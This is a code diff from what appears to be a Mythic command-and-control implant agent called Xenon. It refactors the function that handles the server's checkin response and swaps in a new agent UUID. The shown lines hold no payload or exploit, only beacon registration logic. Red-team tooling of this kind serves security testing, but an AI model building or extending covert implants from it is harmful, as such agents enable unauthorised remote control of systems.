@@ -247,46 +247,33 @@ VOID TaskDispatch(_In_ BYTE cmd, _In_ char* taskUuid, _In_ PPARSER taskParser) {
 
 /**
  * @brief Process the checkin response from the server
- * @param [in] checkinResponseData PPARSER struct containing the checkin response
+ * @param [in] parser PPARSER struct containing the checkin response
  * @return BOOL success or not
  */
-BOOL TaskCheckin(PPARSER checkinResponseData)
+BOOL TaskCheckin(PPARSER parser)
 {   
-    if (checkinResponseData == NULL)
+    if ( parser == NULL )
     {
         _err("Checkin data cannot be null.");
         return FALSE;
     }
-
-    BOOL bStatus = FALSE;
     
-    BYTE checkinByte = ParserGetByte(checkinResponseData);
-    if (checkinByte != CHECKIN)
+    BYTE checkinByte = ParserGetByte(parser);
+    if ( checkinByte != CHECKIN )
     {
         _err("CHECKIN byte 0x%x != 0xF1", checkinByte);
-        goto end;
+        return FALSE;
     }
 
     // Mythic sends a new UUID after the checkin, we need to update it
     SIZE_T sizeUuid = TASK_UUID_SIZE;
-    PCHAR tempUUID = ParserGetString(checkinResponseData, &sizeUuid);           // ToDo use ParserStringCopy
+    PCHAR  newUuid  = ParserStringCopy(parser, &sizeUuid);               // allocates 
 
-    // Allocate memory for newUUID and copy the UUID string
-    PCHAR newUUID = (PCHAR)malloc(sizeUuid + 1);  // +1 for the null terminator
-    if (newUUID == NULL) {
-        goto end;
-    }
-    memcpy(newUUID, tempUUID, sizeUuid);  // Copy UUID bytes
-    newUUID[sizeUuid] = '\0';             // Null-terminate the string
+    _dbg("[CHECKIN] Setting new Agent UUID -> %s", newUuid);
 
-    _dbg("[CHECKIN] Setting new Agent UUID -> %s", newUUID);
+    XenonUpdateUuid(newUuid);
 
-    XenonUpdateUuid(newUUID);
-
-    bStatus = TRUE;
-
-end:
-    return bStatus;
+    return TRUE;
 }
 
 
